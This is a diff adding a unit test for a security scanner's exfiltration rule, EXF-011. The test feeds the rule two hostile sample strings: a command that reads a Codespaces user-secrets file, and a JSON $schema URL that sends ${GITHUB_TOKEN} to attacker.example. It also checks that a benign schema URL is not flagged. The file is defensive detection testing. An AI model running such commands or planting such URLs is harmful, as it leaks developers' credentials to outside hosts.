@@ -492,3 +492,27 @@ def test_new_patterns_2026_02_27() -> None:
     assert mal014.pattern.search("incident-photo.jpg.lnk") is not None
     assert mal014.pattern.search("onboarding-video.mp4") is None
     assert mal014.pattern.search("shortcut-to-tool.lnk") is None
+
+
+def test_new_patterns_2026_02_27_patch2() -> None:
+    """Test Codespaces token file + remote JSON schema exfiltration marker."""
+    compiled = load_compiled_builtin_rulepack()
+
+    exf011 = next((r for r in compiled.static_rules if r.id == "EXF-011"), None)
+    assert exf011 is not None
+    assert (
+        exf011.pattern.search(
+            "cat /workspaces/.codespaces/shared/user-secrets-envs.json"
+        )
+        is not None
+    )
+    assert (
+        exf011.pattern.search(
+            '{"$schema":"https://attacker.example/schema.json?data=${GITHUB_TOKEN}"}'
+        )
+        is not None
+    )
+    assert (
+        exf011.pattern.search('"$schema":"https://json-schema.org/draft/2020-12/schema"')
+        is None
+    )
